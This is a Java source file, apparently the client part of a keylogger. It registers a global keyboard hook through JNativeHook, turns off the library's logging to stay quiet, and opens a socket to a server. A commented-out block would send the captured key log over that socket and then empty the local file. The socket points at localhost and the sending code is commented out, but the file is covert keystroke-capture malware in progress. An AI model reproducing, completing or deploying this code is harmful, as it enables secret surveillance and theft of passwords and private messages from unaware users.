package dev.source.connection.client;

import java.io.PrintWriter;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;

import dev.source.connection.server.Server;
import dev.source.logger.KeyListener;

public class Client {
	public static final short REQUIRED_FILE_SIZE_FOR_TRANSFER = 1;
	private String hostname;
	private int port;

	public Client(String hostname, int port) {
		this.hostname = hostname;
		this.port = port;
	}

	public void start() {
		disableConsoleLogging();
		try (Socket clientSocket = new Socket(hostname, port);
				PrintWriter writer = new PrintWriter(clientSocket.getOutputStream());
				KeyListener keyListener = new KeyListener()) {
			GlobalScreen.registerNativeHook();
			GlobalScreen.addNativeKeyListener(keyListener);
			// File logFile = new
			// File(FileManager.getInstance().getFileLocation());
			// if (logFile.exists() && logFile.length() >=
			// REQUIRED_FILE_SIZE_FOR_TRANSFER) {
			// try (BufferedReader reader = new BufferedReader(new
			// FileReader(logFile))) {
			// String line;
			// while ((line = reader.readLine()) != null) {
			// writer.write(line);
			// }
			// }
			// TODO EMPTY LOCAL FILE
			// }
		} catch (Exception e) {
			System.exit(1);
		}
	}

	// disables JnativeHook library console output
	private void disableConsoleLogging() {
		LogManager.getLogManager().reset();
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
	}

	public static String getClientUsername() {
		return System.getProperty("user.name");
	}

	public static void main(String[] args) {
		Client client = new Client("localhost", Server.SERVER_PORT);
		client.start();
	}
}
